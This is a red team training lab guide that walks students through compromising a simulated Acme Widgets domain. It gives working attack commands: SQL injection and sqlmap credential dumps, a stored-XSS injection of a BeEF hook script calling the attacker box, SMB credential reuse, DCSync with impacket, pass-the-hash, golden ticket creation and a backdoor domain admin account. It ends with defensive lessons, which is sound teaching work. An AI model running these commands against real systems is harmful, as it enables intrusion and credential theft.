# Red Team Training Lab - Student Guide

## Lab Overview

Welcome to the Red Team Training Lab. You will play the role of a penetration tester who has been hired to assess Acme Widgets' security posture. Your goal is to gain Domain Admin access starting from a position outside the network.

### Network Architecture

```
                    INTERNET (172.16.0.0/24)
                    +---------------------------+
                    |  kali (172.16.0.10)       |  <-- Your Attack Box
                    |  redir1 (172.16.0.20)     |
                    |  redir2 (172.16.0.21)     |
                    |  webserver (172.16.0.100) |  <-- WordPress (your target!)
                    +-----------+---------------+
                                |
                    ============|============  (Firewall)
                                |
                    DMZ (172.16.1.0/24)
                    +-----------------------+
                    | webserver (172.16.1.10) |  <-- Same server, internal IP
                    +-----------+-----------+
                                |
                    ============|============  (Firewall)
                                |
                    INTERNAL (172.16.2.0/24)
                    +-----------------------+
                    | DC01 (172.16.2.10)     |  <-- Domain Controller
                    | fileserver (.2.20)     |  <-- SMB File Server
                    | ws01 (172.16.2.30)     |  <-- Employee Workstation
                    +-----------------------+

Note: The webserver is multi-homed - accessible from your network at
172.16.0.100 and internally at 172.16.1.10.
```

### Learning Objectives

By the end of this lab, you will understand:
- Network reconnaissance and enumeration
- SQL injection attacks and credential extraction
- Cross-site scripting (XSS) and browser exploitation with BeEF
- Lateral movement using stolen credentials
- Active Directory attacks (DCSync)
- The importance of defense-in-depth

---

## Phase 1: Reconnaissance

### 1.1 Understanding Your Position

First, let's understand our position in the network. Open a terminal on your Kali box.

```bash
# Check your IP address
ip addr show eth0
```

You should see `172.16.0.10` - you're on the "internet" network, simulating an external attacker.

### 1.2 Network Discovery

Let's discover what hosts are reachable from our position.

```bash
# Scan your network (the "Internet" segment where attackers start)
nmap -sn 172.16.0.0/24
```

**What you're doing:** This performs a ping sweep to find live hosts without doing a full port scan. The `-sn` flag means "no port scan" - just host discovery.

**Expected result:** You should find several hosts including `172.16.0.100` (webserver) - this is your primary target.

### 1.3 Service Enumeration

Now let's see what services are running on the discovered host.

```bash
# Full port scan with service detection
nmap -sV -sC 172.16.0.100
```

**What the flags mean:**
- `-sV`: Probe open ports to determine service/version info
- `-sC`: Run default NSE scripts for additional enumeration
- `-p-`: Scan all 65535 ports (not just common ones)

**Expected result:** You should see:
- Port 80 (HTTP) - Apache/nginx web server
- Port 3306 (MySQL) - Database (likely firewalled but detected)

---

## Phase 2: Web Application Attack (SQL Injection)

### 2.1 Web Enumeration

Let's explore the web application.

```bash
# Open the website in a browser or use curl
curl -s http://172.16.0.100 | head -50
```

Or open Firefox and navigate to `http://172.16.0.100`

**What you're looking for:**
- Technology stack (WordPress, custom app, etc.)
- Interesting pages and functionality
- Login forms, search boxes, or other user input fields

### 2.2 Directory Discovery

Let's find hidden directories and pages.

```bash
# Use gobuster to find directories
gobuster dir -u http://172.16.0.100 -w /usr/share/wordlists/dirb/common.txt
```

**What you're doing:** Brute-forcing common directory names to find hidden content.

**Look for:** The `/employee-directory/` page - this is Acme's internal employee portal.

### 2.3 Testing for SQL Injection

Navigate to the Employee Directory page:
```
http://172.16.0.100/employee-directory/
```

You'll see a search box. Let's test if it's vulnerable to SQL injection.

```bash
# Test with a single quote to see if we get an error
curl "http://172.16.0.100/employee-directory/?search='"
```

**What you're doing:** The single quote (`'`) breaks SQL syntax if input isn't sanitized. If the app is vulnerable, you'll see an error or unexpected behavior.

### 2.4 Confirming SQL Injection

Try a boolean-based test:

```bash
# This should return results (always true)
curl "http://172.16.0.100/employee-directory/?search=' OR '1'='1"

# This should return nothing (always false)
curl "http://172.16.0.100/employee-directory/?search=' AND '1'='2"
```

**Understanding the attack:**
- The search query becomes: `WHERE name LIKE '%' OR '1'='1%'`
- Since `'1'='1'` is always true, it returns all records
- This confirms the application is vulnerable to SQL injection

### 2.5 Extracting Data with SQLMap

Now let's use sqlmap to automate the extraction:

```bash
# Let sqlmap identify the vulnerability
sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --batch
```

**What `--batch` does:** Accepts default answers to all prompts (useful for automation).

Once confirmed, let's enumerate the database:

```bash
# List all databases
sqlmap -u "http://172.16.0.100/employee-directory/?search=test" --dbs --batch
```

```bash
# List tables in the WordPress database
sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress --tables --batch
```

**Expected result:** You should see a table called `wp_acme_employees`.

### 2.6 Dumping Credentials

```bash
# Dump the employee table
sqlmap -u "http://172.16.0.100/employee-directory/?search=test" -D wordpress -T wp_acme_employees --dump --batch
```

**CRITICAL FINDING:** The output reveals VPN credentials stored in plaintext:

| employee_id | full_name | vpn_username | vpn_password |
|-------------|-----------|--------------|--------------|
| EMP001 | John Smith | jsmith | Summer2024 |
| EMP002 | Mary Williams | mwilliams | Welcome123 |
| EMP003 | Backup Service | svc_backup | Backup2024! |

**Why this matters:**
- Credentials are stored in plaintext (bad practice)
- These might be reused on other systems (password reuse)
- Service accounts often have elevated privileges

---

## Phase 3: Lateral Movement (Credential Reuse)

### 3.1 Understanding the Internal Network

From our recon, we know there's an internal network at `172.16.2.0/24`. While we can't access it directly from the internet, perhaps the DMZ webserver can.

However, let's first test if any of these credentials work on any accessible services.

### 3.2 Testing SMB Access

Let's see if there's a file server accessible from the DMZ that uses these same credentials.

```bash
# First, check if we can reach internal hosts (we're simulating pivoting)
# In this lab, the networks are connected for training purposes

# List SMB shares on the file server
smbclient -L //172.16.2.20 -U svc_backup%Backup2024!
```

**What you're doing:** Testing if the `svc_backup` credentials from the WordPress database also work on the file server (credential reuse attack).

**Expected result:** You should see shares including:
- `public` - Open to everyone
- `sensitive` - Restricted (but svc_backup has access!)
- `accounting` - Restricted

### 3.3 Accessing Sensitive Files

```bash
# Connect to the sensitive share
smbclient //172.16.2.20/sensitive -U svc_backup%Backup2024!
```

Once connected, explore the contents:
```
smb: \> ls
smb: \> cd <directory>
smb: \> get <filename>
```

Or download everything at once:
```bash
# Recursively download the sensitive share
smbget -R smb://172.16.2.20/sensitive -U svc_backup%Backup2024!
```

### 3.4 Critical Discovery

Examine the downloaded files:

```bash
cat passwords.txt
```

**CRITICAL FINDING:** You've discovered:
```
Domain Admin (emergency): Adm1n2024!
```

**Why this matters:** You now have the Domain Administrator password. But let's explore another attack path that would work even without finding this file.

---

## Phase 4: Browser Exploitation with BeEF (XSS)

### 4.1 Understanding XSS

The Employee Directory has another vulnerability: Cross-Site Scripting (XSS) in the "notes" field. If we can inject JavaScript, we can attack anyone who views that page.

### 4.2 Starting BeEF

BeEF (Browser Exploitation Framework) lets you control browsers that execute your JavaScript hook.

```bash
# Start BeEF (on Kali)
beef-xss
```

**Default credentials:** `beef` / `beef`

Access the BeEF console at: `http://127.0.0.1:3000/ui/panel`

The hook URL will be something like:
```
http://172.16.0.10:3000/hook.js
```

### 4.3 Injecting the Hook via SQL Injection

We can use SQL injection to UPDATE an employee's notes field with our BeEF hook:

```bash
# Using sqlmap to inject our XSS payload
sqlmap -u "http://172.16.0.100/employee-directory/?search=test" \
  --sql-query="UPDATE wp_acme_employees SET notes='<script src=\"http://172.16.0.10:3000/hook.js\"></script>' WHERE employee_id='EMP001'"
```

**What you're doing:**
- Using SQL injection to modify database content
- Injecting a `<script>` tag that loads BeEF's hook.js
- Anyone viewing EMP001's details will execute this script

### 4.4 Waiting for Victims

The workstation (`ws01`) is simulating an employee who periodically browses the WordPress site. When they view the employee directory and click on the infected employee...

**Watch the BeEF console!** You should see a new browser appear under "Online Browsers."

### 4.5 Browser Exploitation

Once a browser is hooked, you can:

1. **Get browser info:** See browser version, plugins, OS
2. **Get cookies:** Steal session cookies
3. **Social engineering:** Display fake login prompts
4. **Network discovery:** Use the victim's browser to scan internal networks

Try these BeEF modules:
- `Browser > Get Cookie`
- `Social Engineering > Pretty Theft` (fake login)
- `Network > Get Internal IP`

---

## Phase 5: Active Directory Attack (DCSync)

### 5.1 Understanding DCSync

Remember the `svc_backup` account? This service account has been misconfigured with "Replicating Directory Changes" permissions. This allows it to perform a DCSync attack - pretending to be a Domain Controller and requesting password hashes.

### 5.2 Performing DCSync with Impacket

```bash
# Use secretsdump.py to perform DCSync
impacket-secretsdump 'acmewidgets.local/svc_backup:Backup2024!@172.16.2.10'
```

**What you're doing:**
- Authenticating as `svc_backup`
- Using the "Replicating Directory Changes" permission
- Requesting all password hashes from the DC (just like a real DC would)

**Expected output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::
jsmith:1103:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXX:::
...
```

### 5.3 Understanding the Output

The format is: `username:RID:LM_hash:NTLM_hash:::`

**Why this matters:**
- NTLM hashes can be used for Pass-the-Hash attacks
- They can be cracked offline to reveal plaintext passwords
- The `krbtgt` hash allows Golden Ticket attacks

### 5.4 Pass-the-Hash Attack

You don't even need to crack the password. Use the hash directly:

```bash
# Use the Administrator's NTLM hash to get a shell
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> Administrator@172.16.2.10
```

**You now have Domain Admin access!**

---

## Phase 6: Post-Exploitation

### 6.1 Verify Your Access

```bash
# On the DC, verify you're Administrator
whoami
whoami /groups
```

### 6.2 Explore the Domain

```bash
# List all domain users
net user /domain

# List all domain admins
net group "Domain Admins" /domain

# List all computers
net group "Domain Computers" /domain
```

### 6.3 Create Persistence (For Education Only)

**WARNING:** In real engagements, only create persistence if explicitly authorized.

```bash
# Create a new domain admin (for persistence)
net user hacker P@ssw0rd /add /domain
net group "Domain Admins" hacker /add /domain
```

---

## Attack Summary

Here's the complete attack chain you executed:

```
1. RECONNAISSANCE
   └── Network scanning with nmap
       └── Found webserver at 172.16.0.100

2. WEB APPLICATION ATTACK
   └── Discovered WordPress Employee Directory
       └── SQL Injection vulnerability
           └── Extracted plaintext credentials:
               - jsmith / Summer2024
               - mwilliams / Welcome123
               - svc_backup / Backup2024!

3. LATERAL MOVEMENT
   └── Credential reuse on file server (172.16.2.20)
       └── Accessed "sensitive" SMB share
           └── Found Domain Admin password in passwords.txt

4. BROWSER EXPLOITATION (Alternative Path)
   └── XSS injection via SQL Injection
       └── BeEF hook captured employee browser
           └── Social engineering / internal network access

5. ACTIVE DIRECTORY ATTACK
   └── DCSync attack using svc_backup credentials
       └── Extracted all domain password hashes
           └── Pass-the-Hash to Domain Admin

6. DOMAIN COMPROMISE
   └── Full administrative access to acmewidgets.local
```

---

## Defensive Lessons

### What Went Wrong (Blue Team Perspective)

| Vulnerability | Impact | Mitigation |
|--------------|--------|------------|
| SQL Injection | Credential theft | Parameterized queries, input validation, WAF |
| Plaintext passwords in database | Direct credential exposure | Hash passwords, use secrets manager |
| Stored XSS | Browser compromise | Output encoding, CSP headers |
| Password reuse | Lateral movement | Unique passwords, password manager |
| Sensitive files on share | Data exfiltration | Proper access controls, DLP |
| DCSync rights for service account | Domain compromise | Principle of least privilege |
| No network segmentation | Easy pivoting | Proper firewall rules, Zero Trust |

### Key Takeaways

1. **Defense in Depth:** One vulnerability shouldn't lead to total compromise
2. **Least Privilege:** Service accounts should only have necessary permissions
3. **Password Hygiene:** Never reuse passwords; never store in plaintext
4. **Input Validation:** All user input is potentially malicious
5. **Monitoring:** Would anyone have detected these attacks?

---

## Challenge Questions

1. Could you have completed this attack without the SQL injection? What would be different?

2. The `svc_backup` account had DCSync rights. What legitimate business need might have led to this misconfiguration?

3. If you were the defender, what single change would have the biggest impact on preventing this attack chain?

4. What logs would you look for to detect each phase of this attack?

5. How would MFA have affected this attack? At which points?

---

## Additional Exercises

### Exercise 1: Manual SQL Injection
Instead of using sqlmap, try to extract data manually using UNION-based injection.

### Exercise 2: Password Cracking
Use hashcat or john to crack the NTLM hashes you extracted:
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Exercise 3: Golden Ticket
Using the `krbtgt` hash from DCSync, create a Golden Ticket for persistent access:
```bash
impacket-ticketer -domain acmewidgets.local -domain-sid <SID> -krbtgt <HASH> Administrator
```

### Exercise 4: BloodHound Analysis
Run BloodHound to visualize the attack paths:
```bash
bloodhound-python -u svc_backup -p 'Backup2024!' -d acmewidgets.local -ns 172.16.2.10
```

---

## Quick Reference Commands

```bash
# Network scanning
nmap -sn 172.16.1.0/24                    # Host discovery
nmap -sV -sC -p- <IP>                     # Full port scan

# SQL Injection
sqlmap -u "<URL>" --dbs                    # List databases
sqlmap -u "<URL>" -D <db> --tables         # List tables
sqlmap -u "<URL>" -D <db> -T <tbl> --dump  # Dump table

# SMB
smbclient -L //<IP> -U <user>%<pass>       # List shares
smbclient //<IP>/<share> -U <user>%<pass>  # Connect to share

# Active Directory
impacket-secretsdump '<domain>/<user>:<pass>@<DC>'    # DCSync
impacket-psexec -hashes <LM>:<NTLM> <user>@<IP>       # Pass-the-Hash

# BeEF
beef-xss                                   # Start BeEF
# Hook: <script src="http://<kali>:3000/hook.js"></script>
```

---

**Good luck, and remember: Only use these techniques with explicit authorization!**
